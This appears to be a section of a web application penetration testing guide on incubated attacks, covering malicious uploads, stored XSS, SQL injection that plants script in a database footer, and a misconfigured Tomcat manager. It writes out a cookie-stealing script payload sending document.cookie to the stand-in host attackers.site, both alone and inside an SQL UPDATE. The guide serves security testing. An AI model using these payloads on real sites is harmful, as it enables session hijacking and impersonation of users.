# Black-Box Testing

## File Upload Example

Verify the content type allowed to upload to the web application and the resultant URL for the uploaded file. Upload a file that will exploit a component in the local user workstation when viewed or downloaded by the user. Send your victim an email or other kind of alert in order to lead him/her to browse the page. The expected result is the exploit will be triggered when the user browses the resultant page or downloads and executes the file from the trusted site.

## XSS Example on a Bulletin Board

1. Introduce JavaScript code as the value for the vulnerable field, for instance `<script>document.write('<img src="http://attackers.site/cv.jpg?'+document.cookie+'">')</script>`
2. Direct users to browse the vulnerable page or wait for the users to browse it. Have a "listener" at `attackers.site` host listening for all incoming connections.
3. When users browse the vulnerable page, a request containing their cookie (`document.cookie` is included as part of the requested URL) will be sent to the `attackers.site` host, such as: `GET /cv.jpg?SignOn=COOKIEVALUE1;%20ASPSESSIONID=ROGUEIDVALUE; HTTP/1.1`
4. Use cookies obtained to impersonate users at the vulnerable site.

## SQL Injection Example

Usually, this set of examples leverages XSS attacks by exploiting a SQL-injection vulnerability. The first thing to test is whether the target site has a SQL injection vulnerability. This is described in [Testing for SQL Injection](05-Testing_for_SQL_Injection.md). For each SQL-injection vulnerability, there is an underlying set of constraints describing the kind of queries that the attacker/pen-tester is allowed to do.

The tester then has to match the XSS attacks he has devised with the entries that he is allowed to insert.

In a similar fashion as in the previous XSS example, use a web page field vulnerable to SQL injection issues to change a value in the database that would be used by the application as input to be shown at the site without proper filtering (this would be a combination of an SQL injection and a XSS issue). For instance, let's suppose there is a `footer` table at the database with all footers for the site pages, including a `notice` field with the legal notice that appears at the bottom of each web page. You could use the following query to inject JavaScript code to the `notice` field at the `footer` table in the database.

```sql
SELECT field1, field2, field3
FROM table_x
WHERE field2 = 'x';
   UPDATE footer
   SET notice = 'Copyright 1999-2030%20
       <script>document.write(\'<img src="http://attackers.site/cv.jpg?\'+document.cookie+\'">\')</script>'
   WHERE notice = 'Copyright 1999-2030';
```

Now, each user browsing the site will silently send their cookies to the `attackers.site`.

## Misconfigured Server

Some web servers present an administration interface that may allow an attacker to upload active components of her choice to the site. This could be the case with an Apache Tomcat server that doesn’t enforce strong credentials to access its Web Application Manager (or if the pen testers have been able to obtain valid credentials for the administration module by other means).

In this case, a WAR file can be uploaded and a new web application deployed at the site, which will not only allow the pen tester to execute code of her choice locally at the server, but also to plant an application at the trusted site, which the site regular users can then access (most probably with a higher degree of trust than when accessing a different site).

As should also be obvious, the ability to change web page contents at the server, via any vulnerabilities that may be exploitable at the host which will give the attacker webroot write permissions, will also be useful towards planting such an incubated attack on the web server pages (actually, this is a known infection-spread method for some web server worms).

# Gray-Box Testing

Gray-box or white-box testing techniques will be the same as previously discussed.

- Examining input validation is key in mitigating against this vulnerability. If other systems in the enterprise use the same persistence layer they may have weak input validation and the data may be persisted via a `backdoor`.
- To combat the `backdoor` issue for client-side attacks, output validation must also be employed so tainted data shall be encoded prior to displaying to the client, and hence not execute.

